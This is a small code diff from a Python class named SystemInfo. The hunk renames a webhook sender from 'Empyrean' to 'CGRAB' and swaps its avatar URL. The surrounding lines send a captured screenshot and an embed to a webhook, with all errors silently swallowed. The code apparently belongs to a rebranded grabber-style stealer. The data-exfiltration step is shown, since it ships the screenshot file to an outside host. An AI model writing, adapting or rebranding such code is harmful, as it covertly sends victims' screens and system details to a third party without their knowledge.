@@ -56,8 +56,8 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="Empyrean",
-                avatar_url="https://i.imgur.com/HjzfjfR.png"
+                username="CGRAB",
+                avatar_url="https://cdn.discordapp.com/attachments/1049343091116609637/1071442007798579271/a_43251a8d72d23c27de799da39daab7bc.gif"
             )
         except:
             pass
